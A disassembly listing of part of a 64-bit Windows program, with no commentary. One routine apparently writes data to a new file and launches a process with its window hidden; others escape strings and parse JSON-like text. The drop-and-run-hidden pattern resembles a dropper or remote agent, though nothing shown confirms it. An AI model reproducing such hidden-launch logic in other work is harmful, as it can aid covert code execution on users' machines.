   1400044c2:	ba 04 01 00 00       	mov    $0x104,%edx
   1400044c7:	48 89 e9             	mov    %rbp,%rcx
   1400044ca:	4c 8d 05 44 01 01 00 	lea    0x10144(%rip),%r8        # 0x140014615
   1400044d1:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400044d5:	41 ff d6             	call   *%r14
   1400044d8:	45 31 c9             	xor    %r9d,%r9d
   1400044db:	45 31 c0             	xor    %r8d,%r8d
   1400044de:	ba 00 00 00 40       	mov    $0x40000000,%edx
   1400044e3:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400044ea:	00 00 
   1400044ec:	48 89 e9             	mov    %rbp,%rcx
   1400044ef:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400044f6:	00 
   1400044f7:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   1400044fe:	00 
   1400044ff:	ff 15 f3 80 01 00    	call   *0x180f3(%rip)        # 0x14001c5f8
   140004505:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004509:	48 89 c3             	mov    %rax,%rbx
   14000450c:	74 38                	je     0x140004546
   14000450e:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   140004513:	41 89 f0             	mov    %esi,%r8d
   140004516:	48 89 fa             	mov    %rdi,%rdx
   140004519:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004520:	00 00 
   140004522:	48 89 c1             	mov    %rax,%rcx
   140004525:	ff 15 35 82 01 00    	call   *0x18235(%rip)        # 0x14001c760
   14000452b:	48 89 d9             	mov    %rbx,%rcx
   14000452e:	48 8b 1d ab 80 01 00 	mov    0x180ab(%rip),%rbx        # 0x14001c5e0
   140004535:	ff d3                	call   *%rbx
   140004537:	39 74 24 5c          	cmp    %esi,0x5c(%rsp)
   14000453b:	74 23                	je     0x140004560
   14000453d:	48 89 e9             	mov    %rbp,%rcx
   140004540:	ff 15 da 80 01 00    	call   *0x180da(%rip)        # 0x14001c620
   140004546:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000454b:	48 81 c4 78 06 00 00 	add    $0x678,%rsp
   140004552:	5b                   	pop    %rbx
   140004553:	5e                   	pop    %rsi
   140004554:	5f                   	pop    %rdi
   140004555:	5d                   	pop    %rbp
   140004556:	41 5c                	pop    %r12
   140004558:	41 5d                	pop    %r13
   14000455a:	41 5e                	pop    %r14
   14000455c:	41 5f                	pop    %r15
   14000455e:	c3                   	ret
   14000455f:	90                   	nop
   140004560:	49 89 e9             	mov    %rbp,%r9
   140004563:	ba 48 02 00 00       	mov    $0x248,%edx
   140004568:	4c 89 e1             	mov    %r12,%rcx
   14000456b:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004570:	4c 8d 05 b2 00 01 00 	lea    0x100b2(%rip),%r8        # 0x140014629
   140004577:	41 ff d6             	call   *%r14
   14000457a:	48 8d 94 24 84 00 00 	lea    0x84(%rsp),%rdx
   140004581:	00 
   140004582:	31 c0                	xor    %eax,%eax
   140004584:	45 31 c9             	xor    %r9d,%r9d
   140004587:	4c 8d 84 24 80 00 00 	lea    0x80(%rsp),%r8
   14000458e:	00 
   14000458f:	48 89 d7             	mov    %rdx,%rdi
   140004592:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140004597:	c7 84 24 80 00 00 00 	movl   $0x68,0x80(%rsp)
   14000459e:	68 00 00 00 
   1400045a2:	f3 48 ab             	rep stos %rax,(%rdi)
   1400045a5:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400045aa:	4c 89 e2             	mov    %r12,%rdx
   1400045ad:	c7 84 24 bc 00 00 00 	movl   $0x1,0xbc(%rsp)
   1400045b4:	01 00 00 00 
   1400045b8:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400045bf:	00 00 
   1400045c1:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400045c8:	00 00 
   1400045ca:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   1400045d1:	00 00 
   1400045d3:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400045d9:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   1400045de:	45 31 c0             	xor    %r8d,%r8d
   1400045e1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400045e6:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   1400045eb:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400045f2:	00 00 
   1400045f4:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   1400045fb:	08 
   1400045fc:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140004603:	00 
   140004604:	ff 15 fe 7f 01 00    	call   *0x17ffe(%rip)        # 0x14001c608
   14000460a:	85 c0                	test   %eax,%eax
   14000460c:	0f 84 2b ff ff ff    	je     0x14000453d
   140004612:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004617:	ff d3                	call   *%rbx
   140004619:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000461e:	ff d3                	call   *%rbx
   140004620:	4c 89 e9             	mov    %r13,%rcx
   140004623:	e8 58 f2 ff ff       	call   0x140003880
   140004628:	b8 01 00 00 00       	mov    $0x1,%eax
   14000462d:	e9 19 ff ff ff       	jmp    0x14000454b
   140004632:	90                   	nop
   140004633:	90                   	nop
   140004634:	90                   	nop
   140004635:	90                   	nop
   140004636:	90                   	nop
   140004637:	90                   	nop
   140004638:	90                   	nop
   140004639:	90                   	nop
   14000463a:	90                   	nop
   14000463b:	90                   	nop
   14000463c:	90                   	nop
   14000463d:	90                   	nop
   14000463e:	90                   	nop
   14000463f:	90                   	nop
   140004640:	53                   	push   %rbx
   140004641:	0f b6 01             	movzbl (%rcx),%eax
   140004644:	84 c0                	test   %al,%al
   140004646:	49 89 d2             	mov    %rdx,%r10
   140004649:	0f 84 84 00 00 00    	je     0x1400046d3
   14000464f:	41 8d 58 fe          	lea    -0x2(%r8),%ebx
   140004653:	48 83 c1 01          	add    $0x1,%rcx
   140004657:	31 d2                	xor    %edx,%edx
   140004659:	45 31 c9             	xor    %r9d,%r9d
   14000465c:	eb 39                	jmp    0x140004697
   14000465e:	66 90                	xchg   %ax,%ax
   140004660:	3c 09                	cmp    $0x9,%al
   140004662:	0f 84 d0 00 00 00    	je     0x140004738
   140004668:	3c 0a                	cmp    $0xa,%al
   14000466a:	75 74                	jne    0x1400046e0
   14000466c:	8d 42 02             	lea    0x2(%rdx),%eax
   14000466f:	44 39 c0             	cmp    %r8d,%eax
   140004672:	7d 14                	jge    0x140004688
   140004674:	ba 5c 6e 00 00       	mov    $0x6e5c,%edx
   140004679:	4c 63 c8             	movslq %eax,%r9
   14000467c:	66 41 89 13          	mov    %dx,(%r11)
   140004680:	4c 89 ca             	mov    %r9,%rdx
   140004683:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004688:	0f b6 01             	movzbl (%rcx),%eax
   14000468b:	84 c0                	test   %al,%al
   14000468d:	74 41                	je     0x1400046d0
   14000468f:	48 83 c1 01          	add    $0x1,%rcx
   140004693:	39 da                	cmp    %ebx,%edx
   140004695:	7d 39                	jge    0x1400046d0
   140004697:	4f 8d 1c 0a          	lea    (%r10,%r9,1),%r11
   14000469b:	3c 0d                	cmp    $0xd,%al
   14000469d:	74 71                	je     0x140004710
   14000469f:	7e bf                	jle    0x140004660
   1400046a1:	3c 22                	cmp    $0x22,%al
   1400046a3:	74 4b                	je     0x1400046f0
   1400046a5:	3c 5c                	cmp    $0x5c,%al
   1400046a7:	75 37                	jne    0x1400046e0
   1400046a9:	8d 42 02             	lea    0x2(%rdx),%eax
   1400046ac:	44 39 c0             	cmp    %r8d,%eax
   1400046af:	7d d7                	jge    0x140004688
   1400046b1:	41 b9 5c 5c 00 00    	mov    $0x5c5c,%r9d
   1400046b7:	66 45 89 0b          	mov    %r9w,(%r11)
   1400046bb:	4c 63 c8             	movslq %eax,%r9
   1400046be:	0f b6 01             	movzbl (%rcx),%eax
   1400046c1:	4c 89 ca             	mov    %r9,%rdx
   1400046c4:	84 c0                	test   %al,%al
   1400046c6:	75 c7                	jne    0x14000468f
   1400046c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400046cf:	00 
   1400046d0:	4d 01 ca             	add    %r9,%r10
   1400046d3:	41 c6 02 00          	movb   $0x0,(%r10)
   1400046d7:	5b                   	pop    %rbx
   1400046d8:	c3                   	ret
   1400046d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400046e0:	83 c2 01             	add    $0x1,%edx
   1400046e3:	41 88 03             	mov    %al,(%r11)
   1400046e6:	4c 63 ca             	movslq %edx,%r9
   1400046e9:	eb 9d                	jmp    0x140004688
   1400046eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400046f0:	8d 42 02             	lea    0x2(%rdx),%eax
   1400046f3:	44 39 c0             	cmp    %r8d,%eax
   1400046f6:	7d 90                	jge    0x140004688
   1400046f8:	ba 5c 22 00 00       	mov    $0x225c,%edx
   1400046fd:	4c 63 c8             	movslq %eax,%r9
   140004700:	66 41 89 13          	mov    %dx,(%r11)
   140004704:	4c 89 ca             	mov    %r9,%rdx
   140004707:	e9 7c ff ff ff       	jmp    0x140004688
   14000470c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004710:	8d 42 02             	lea    0x2(%rdx),%eax
   140004713:	44 39 c0             	cmp    %r8d,%eax
   140004716:	0f 8d 6c ff ff ff    	jge    0x140004688
   14000471c:	41 b9 5c 72 00 00    	mov    $0x725c,%r9d
   140004722:	66 45 89 0b          	mov    %r9w,(%r11)
   140004726:	4c 63 c8             	movslq %eax,%r9
   140004729:	4c 89 ca             	mov    %r9,%rdx
   14000472c:	e9 57 ff ff ff       	jmp    0x140004688
   140004731:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004738:	8d 42 02             	lea    0x2(%rdx),%eax
   14000473b:	44 39 c0             	cmp    %r8d,%eax
   14000473e:	0f 8d 44 ff ff ff    	jge    0x140004688
   140004744:	ba 5c 74 00 00       	mov    $0x745c,%edx
   140004749:	4c 63 c8             	movslq %eax,%r9
   14000474c:	66 41 89 13          	mov    %dx,(%r11)
   140004750:	4c 89 ca             	mov    %r9,%rdx
   140004753:	e9 30 ff ff ff       	jmp    0x140004688
   140004758:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000475f:	00 
   140004760:	55                   	push   %rbp
   140004761:	57                   	push   %rdi
   140004762:	56                   	push   %rsi
   140004763:	53                   	push   %rbx
   140004764:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   14000476b:	48 85 c9             	test   %rcx,%rcx
   14000476e:	48 89 cb             	mov    %rcx,%rbx
   140004771:	49 89 d1             	mov    %rdx,%r9
   140004774:	74 69                	je     0x1400047df
   140004776:	48 85 d2             	test   %rdx,%rdx
   140004779:	74 64                	je     0x1400047df
   14000477b:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140004780:	ba 00 01 00 00       	mov    $0x100,%edx
   140004785:	4c 8d 05 d4 30 01 00 	lea    0x130d4(%rip),%r8        # 0x140017860
   14000478c:	48 89 f1             	mov    %rsi,%rcx
   14000478f:	ff 15 6b 80 01 00    	call   *0x1806b(%rip)        # 0x14001c800
   140004795:	48 89 d9             	mov    %rbx,%rcx
   140004798:	48 89 f2             	mov    %rsi,%rdx
   14000479b:	e8 c8 e0 00 00       	call   0x140012868
   1400047a0:	48 85 c0             	test   %rax,%rax
   1400047a3:	48 89 c3             	mov    %rax,%rbx
   1400047a6:	74 37                	je     0x1400047df
   1400047a8:	48 89 f1             	mov    %rsi,%rcx
   1400047ab:	e8 a0 e0 00 00       	call   0x140012850
   1400047b0:	48 b9 00 26 00 00 01 	movabs $0x400000100002600,%rcx
   1400047b7:	00 00 04 
   1400047ba:	48 01 d8             	add    %rbx,%rax
   1400047bd:	0f b6 10             	movzbl (%rax),%edx
   1400047c0:	84 d2                	test   %dl,%dl
   1400047c2:	74 1b                	je     0x1400047df
   1400047c4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400047c8:	80 fa 3a             	cmp    $0x3a,%dl
   1400047cb:	77 12                	ja     0x1400047df
   1400047cd:	48 0f a3 d1          	bt     %rdx,%rcx
   1400047d1:	73 1d                	jae    0x1400047f0
   1400047d3:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   1400047d7:	48 83 c0 01          	add    $0x1,%rax
   1400047db:	84 d2                	test   %dl,%dl
   1400047dd:	75 e9                	jne    0x1400047c8
   1400047df:	31 c0                	xor    %eax,%eax
   1400047e1:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   1400047e8:	5b                   	pop    %rbx
   1400047e9:	5e                   	pop    %rsi
   1400047ea:	5f                   	pop    %rdi
   1400047eb:	5d                   	pop    %rbp
   1400047ec:	c3                   	ret
   1400047ed:	0f 1f 00             	nopl   (%rax)
   1400047f0:	80 fa 22             	cmp    $0x22,%dl
   1400047f3:	75 ea                	jne    0x1400047df
   1400047f5:	0f b6 70 01          	movzbl 0x1(%rax),%esi
   1400047f9:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400047fd:	48 89 f8             	mov    %rdi,%rax
   140004800:	40 84 f6             	test   %sil,%sil
   140004803:	89 f2                	mov    %esi,%edx
   140004805:	75 15                	jne    0x14000481c
   140004807:	e9 12 01 00 00       	jmp    0x14000491e
   14000480c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004810:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140004814:	48 83 c0 01          	add    $0x1,%rax
   140004818:	84 d2                	test   %dl,%dl
   14000481a:	74 0b                	je     0x140004827
   14000481c:	80 fa 22             	cmp    $0x22,%dl
   14000481f:	75 ef                	jne    0x140004810
   140004821:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%rax)
   140004825:	74 e9                	je     0x140004810
   140004827:	48 29 f8             	sub    %rdi,%rax
   14000482a:	8d 48 01             	lea    0x1(%rax),%ecx
   14000482d:	48 89 c3             	mov    %rax,%rbx
   140004830:	89 c5                	mov    %eax,%ebp
   140004832:	48 63 c9             	movslq %ecx,%rcx
   140004835:	e8 d6 df 00 00       	call   0x140012810
   14000483a:	48 85 c0             	test   %rax,%rax
   14000483d:	74 a0                	je     0x1400047df
   14000483f:	85 db                	test   %ebx,%ebx
   140004841:	0f 8e ea 00 00 00    	jle    0x140004931
   140004847:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000484c:	45 31 c0             	xor    %r8d,%r8d
   14000484f:	eb 22                	jmp    0x140004873
   140004851:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004858:	40 88 74 08 ff       	mov    %sil,-0x1(%rax,%rcx,1)
   14000485d:	4c 8d 41 01          	lea    0x1(%rcx),%r8
   140004861:	39 d5                	cmp    %edx,%ebp
   140004863:	7e 21                	jle    0x140004886
   140004865:	4c 63 ca             	movslq %edx,%r9
   140004868:	42 0f b6 34 0f       	movzbl (%rdi,%r9,1),%esi
   14000486d:	4c 89 c1             	mov    %r8,%rcx
   140004870:	41 89 d0             	mov    %edx,%r8d
   140004873:	41 8d 50 01          	lea    0x1(%r8),%edx
   140004877:	40 80 fe 5c          	cmp    $0x5c,%sil
   14000487b:	75 db                	jne    0x140004858
   14000487d:	39 d5                	cmp    %edx,%ebp
   14000487f:	7f 1f                	jg     0x1400048a0
   140004881:	c6 44 08 ff 5c       	movb   $0x5c,-0x1(%rax,%rcx,1)
   140004886:	48 63 c9             	movslq %ecx,%rcx
   140004889:	48 01 c1             	add    %rax,%rcx
   14000488c:	c6 01 00             	movb   $0x0,(%rcx)
   14000488f:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140004896:	5b                   	pop    %rbx
   140004897:	5e                   	pop    %rsi
   140004898:	5f                   	pop    %rdi
   140004899:	5d                   	pop    %rbp
   14000489a:	c3                   	ret
   14000489b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048a0:	4c 63 ca             	movslq %edx,%r9
   1400048a3:	42 0f b6 34 0f       	movzbl (%rdi,%r9,1),%esi
   1400048a8:	40 80 fe 6e          	cmp    $0x6e,%sil
   1400048ac:	74 62                	je     0x140004910
   1400048ae:	7f 30                	jg     0x1400048e0
   1400048b0:	40 80 fe 22          	cmp    $0x22,%sil
   1400048b4:	74 1a                	je     0x1400048d0
   1400048b6:	40 80 fe 5c          	cmp    $0x5c,%sil
   1400048ba:	74 14                	je     0x1400048d0
   1400048bc:	c6 44 08 ff 5c       	movb   $0x5c,-0x1(%rax,%rcx,1)
   1400048c1:	4c 8d 41 01          	lea    0x1(%rcx),%r8
   1400048c5:	eb a1                	jmp    0x140004868
   1400048c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400048ce:	00 00 
   1400048d0:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400048d4:	eb 82                	jmp    0x140004858
   1400048d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400048dd:	00 00 00 
   1400048e0:	40 80 fe 72          	cmp    $0x72,%sil
   1400048e4:	74 1a                	je     0x140004900
   1400048e6:	40 80 fe 74          	cmp    $0x74,%sil
   1400048ea:	75 d0                	jne    0x1400048bc
   1400048ec:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400048f0:	be 09 00 00 00       	mov    $0x9,%esi
   1400048f5:	e9 5e ff ff ff       	jmp    0x140004858
   1400048fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004900:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004904:	be 0d 00 00 00       	mov    $0xd,%esi
   140004909:	e9 4a ff ff ff       	jmp    0x140004858
   14000490e:	66 90                	xchg   %ax,%ax
   140004910:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004914:	be 0a 00 00 00       	mov    $0xa,%esi
   140004919:	e9 3a ff ff ff       	jmp    0x140004858
   14000491e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004923:	e8 e8 de 00 00       	call   0x140012810
   140004928:	48 85 c0             	test   %rax,%rax
   14000492b:	0f 84 ae fe ff ff    	je     0x1400047df
   140004931:	48 89 c1             	mov    %rax,%rcx
   140004934:	e9 53 ff ff ff       	jmp    0x14000488c
   140004939:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004940:	57                   	push   %rdi
   140004941:	56                   	push   %rsi
   140004942:	53                   	push   %rbx
   140004943:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   14000494a:	48 85 c9             	test   %rcx,%rcx
   14000494d:	48 89 cb             	mov    %rcx,%rbx
   140004950:	44 89 c6             	mov    %r8d,%esi
   140004953:	0f 84 c7 00 00 00    	je     0x140004a20
   140004959:	48 85 d2             	test   %rdx,%rdx
   14000495c:	0f 84 be 00 00 00    	je     0x140004a20
   140004962:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140004967:	49 89 d1             	mov    %rdx,%r9
   14000496a:	ba 00 01 00 00       	mov    $0x100,%edx
   14000496f:	4c 8d 05 ea 2e 01 00 	lea    0x12eea(%rip),%r8        # 0x140017860
   140004976:	48 89 f9             	mov    %rdi,%rcx
   140004979:	ff 15 81 7e 01 00    	call   *0x17e81(%rip)        # 0x14001c800
   14000497f:	48 89 d9             	mov    %rbx,%rcx
   140004982:	48 89 fa             	mov    %rdi,%rdx
   140004985:	e8 de de 00 00       	call   0x140012868
   14000498a:	48 85 c0             	test   %rax,%rax
   14000498d:	48 89 c3             	mov    %rax,%rbx
   140004990:	0f 84 8a 00 00 00    	je     0x140004a20
   140004996:	48 89 f9             	mov    %rdi,%rcx
   140004999:	e8 b2 de 00 00       	call   0x140012850
   14000499e:	48 ba 00 26 00 00 01 	movabs $0x400000100002600,%rdx
   1400049a5:	00 00 04 
   1400049a8:	48 01 c3             	add    %rax,%rbx
   1400049ab:	0f b6 03             	movzbl (%rbx),%eax
   1400049ae:	84 c0                	test   %al,%al
   1400049b0:	74 1c                	je     0x1400049ce
   1400049b2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400049b8:	3c 3a                	cmp    $0x3a,%al
   1400049ba:	77 12                	ja     0x1400049ce
   1400049bc:	48 0f a3 c2          	bt     %rax,%rdx
   1400049c0:	73 0c                	jae    0x1400049ce
   1400049c2:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   1400049c6:	48 83 c3 01          	add    $0x1,%rbx
   1400049ca:	84 c0                	test   %al,%al
   1400049cc:	75 ea                	jne    0x1400049b8
   1400049ce:	48 8d 15 90 2e 01 00 	lea    0x12e90(%rip),%rdx        # 0x140017865
   1400049d5:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400049db:	48 89 d9             	mov    %rbx,%rcx
   1400049de:	e8 75 de 00 00       	call   0x140012858
   1400049e3:	89 c2                	mov    %eax,%edx
   1400049e5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400049ea:	85 d2                	test   %edx,%edx
   1400049ec:	74 34                	je     0x140004a22
   1400049ee:	48 8d 15 75 2e 01 00 	lea    0x12e75(%rip),%rdx        # 0x14001786a
   1400049f5:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   1400049fb:	48 89 d9             	mov    %rbx,%rcx
   1400049fe:	e8 55 de 00 00       	call   0x140012858
   140004a03:	85 c0                	test   %eax,%eax
   140004a05:	74 1b                	je     0x140004a22
   140004a07:	48 89 d9             	mov    %rbx,%rcx
   140004a0a:	e8 b1 dd 00 00       	call   0x1400127c0
   140004a0f:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
   140004a16:	5b                   	pop    %rbx
   140004a17:	5e                   	pop    %rsi
   140004a18:	5f                   	pop    %rdi
   140004a19:	c3                   	ret
   140004a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004a20:	89 f0                	mov    %esi,%eax
   140004a22:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
   140004a29:	5b                   	pop    %rbx
   140004a2a:	5e                   	pop    %rsi
   140004a2b:	5f                   	pop    %rdi
   140004a2c:	c3                   	ret
   140004a2d:	0f 1f 00             	nopl   (%rax)
   140004a30:	56                   	push   %rsi
   140004a31:	53                   	push   %rbx
   140004a32:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140004a39:	48 85 c9             	test   %rcx,%rcx
   140004a3c:	48 89 cb             	mov    %rcx,%rbx
   140004a3f:	49 89 d1             	mov    %rdx,%r9
   140004a42:	0f 84 08 01 00 00    	je     0x140004b50
   140004a48:	48 85 d2             	test   %rdx,%rdx
   140004a4b:	0f 84 ff 00 00 00    	je     0x140004b50
   140004a51:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140004a56:	ba 00 01 00 00       	mov    $0x100,%edx
   140004a5b:	4c 8d 05 fe 2d 01 00 	lea    0x12dfe(%rip),%r8        # 0x140017860
   140004a62:	48 89 f1             	mov    %rsi,%rcx
   140004a65:	ff 15 95 7d 01 00    	call   *0x17d95(%rip)        # 0x14001c800
   140004a6b:	48 89 d9             	mov    %rbx,%rcx
   140004a6e:	48 89 f2             	mov    %rsi,%rdx
   140004a71:	e8 f2 dd 00 00       	call   0x140012868
   140004a76:	48 85 c0             	test   %rax,%rax
   140004a79:	48 89 c3             	mov    %rax,%rbx
   140004a7c:	0f 84 ce 00 00 00    	je     0x140004b50
   140004a82:	48 89 f1             	mov    %rsi,%rcx
   140004a85:	e8 c6 dd 00 00       	call   0x140012850
   140004a8a:	48 01 c3             	add    %rax,%rbx
   140004a8d:	0f b6 03             	movzbl (%rbx),%eax
   140004a90:	84 c0                	test   %al,%al
   140004a92:	75 1c                	jne    0x140004ab0
   140004a94:	e9 af 00 00 00       	jmp    0x140004b48
   140004a99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004aa0:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   140004aa4:	48 83 c3 01          	add    $0x1,%rbx
   140004aa8:	84 c0                	test   %al,%al
   140004aaa:	0f 84 98 00 00 00    	je     0x140004b48
   140004ab0:	3c 5b                	cmp    $0x5b,%al
   140004ab2:	75 ec                	jne    0x140004aa0
   140004ab4:	0f b6 13             	movzbl (%rbx),%edx
   140004ab7:	84 d2                	test   %dl,%dl
   140004ab9:	0f 84 f1 00 00 00    	je     0x140004bb0
   140004abf:	48 89 d9             	mov    %rbx,%rcx
   140004ac2:	45 31 c0             	xor    %r8d,%r8d
   140004ac5:	eb 2e                	jmp    0x140004af5
   140004ac7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004ace:	00 00 
   140004ad0:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004ad4:	80 fa 5d             	cmp    $0x5d,%dl
   140004ad7:	0f 84 83 00 00 00    	je     0x140004b60
   140004add:	80 fa 22             	cmp    $0x22,%dl
   140004ae0:	0f 84 9a 00 00 00    	je     0x140004b80
   140004ae6:	48 89 c8             	mov    %rcx,%rax
   140004ae9:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140004aed:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140004af1:	84 d2                	test   %dl,%dl
   140004af3:	74 18                	je     0x140004b0d
   140004af5:	80 fa 5b             	cmp    $0x5b,%dl
   140004af8:	75 d6                	jne    0x140004ad0
   140004afa:	48 89 c8             	mov    %rcx,%rax
   140004afd:	41 83 c0 01          	add    $0x1,%r8d
   140004b01:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140004b05:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140004b09:	84 d2                	test   %dl,%dl
   140004b0b:	75 e8                	jne    0x140004af5
   140004b0d:	48 29 d9             	sub    %rbx,%rcx
   140004b10:	8d 51 01             	lea    0x1(%rcx),%edx
   140004b13:	48 63 f1             	movslq %ecx,%rsi
   140004b16:	48 63 d2             	movslq %edx,%rdx
   140004b19:	48 89 d1             	mov    %rdx,%rcx
   140004b1c:	e8 ef dc 00 00       	call   0x140012810
   140004b21:	49 89 f0             	mov    %rsi,%r8
   140004b24:	48 89 da             	mov    %rbx,%rdx
   140004b27:	48 89 c1             	mov    %rax,%rcx
   140004b2a:	e8 e9 dc 00 00       	call   0x140012818
   140004b2f:	48 89 c1             	mov    %rax,%rcx
   140004b32:	c6 04 30 00          	movb   $0x0,(%rax,%rsi,1)
   140004b36:	48 89 c8             	mov    %rcx,%rax
   140004b39:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140004b40:	5b                   	pop    %rbx
   140004b41:	5e                   	pop    %rsi
   140004b42:	c3                   	ret
   140004b43:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b48:	3c 5b                	cmp    $0x5b,%al
   140004b4a:	0f 84 64 ff ff ff    	je     0x140004ab4
   140004b50:	31 c9                	xor    %ecx,%ecx
   140004b52:	48 89 c8             	mov    %rcx,%rax
   140004b55:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140004b5c:	5b                   	pop    %rbx
   140004b5d:	5e                   	pop    %rsi
   140004b5e:	c3                   	ret
   140004b5f:	90                   	nop
   140004b60:	41 83 e8 01          	sub    $0x1,%r8d
   140004b64:	0f 85 7c ff ff ff    	jne    0x140004ae6
   140004b6a:	48 29 d8             	sub    %rbx,%rax
   140004b6d:	8d 50 01             	lea    0x1(%rax),%edx
   140004b70:	48 63 f0             	movslq %eax,%rsi
   140004b73:	48 63 d2             	movslq %edx,%rdx
   140004b76:	eb a1                	jmp    0x140004b19
   140004b78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004b7f:	00 
   140004b80:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   140004b84:	84 d2                	test   %dl,%dl
   140004b86:	75 18                	jne    0x140004ba0
   140004b88:	e9 5c ff ff ff       	jmp    0x140004ae9
   140004b8d:	0f 1f 00             	nopl   (%rax)
   140004b90:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140004b94:	48 83 c0 01          	add    $0x1,%rax
   140004b98:	84 d2                	test   %dl,%dl
   140004b9a:	0f 84 49 ff ff ff    	je     0x140004ae9
   140004ba0:	80 fa 22             	cmp    $0x22,%dl
   140004ba3:	75 eb                	jne    0x140004b90
   140004ba5:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%rax)
   140004ba9:	74 e5                	je     0x140004b90
   140004bab:	e9 39 ff ff ff       	jmp    0x140004ae9
   140004bb0:	31 f6                	xor    %esi,%esi
   140004bb2:	ba 01 00 00 00       	mov    $0x1,%edx
   140004bb7:	e9 5d ff ff ff       	jmp    0x140004b19
   140004bbc:	0f 1f 40 00          	nopl   0x0(%rax)
   140004bc0:	57                   	push   %rdi
   140004bc1:	56                   	push   %rsi
   140004bc2:	53                   	push   %rbx
   140004bc3:	48 83 ec 20          	sub    $0x20,%rsp
   140004bc7:	49 b9 01 10 00 00 00 	movabs $0x800000000001001,%r9
   140004bce:	00 00 08 
   140004bd1:	49 89 d2             	mov    %rdx,%r10
   140004bd4:	48 8b 11             	mov    (%rcx),%rdx
   140004bd7:	48 89 ce             	mov    %rcx,%rsi
   140004bda:	0f b6 02             	movzbl (%rdx),%eax
   140004bdd:	84 c0                	test   %al,%al
   140004bdf:	75 1c                	jne    0x140004bfd
   140004be1:	eb 3a                	jmp    0x140004c1d
   140004be3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004be8:	8d 48 e0             	lea    -0x20(%rax),%ecx
   140004beb:	49 0f a3 c9          	bt     %rcx,%r9
   140004bef:	73 47                	jae    0x140004c38
   140004bf1:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004bf5:	48 83 c2 01          	add    $0x1,%rdx
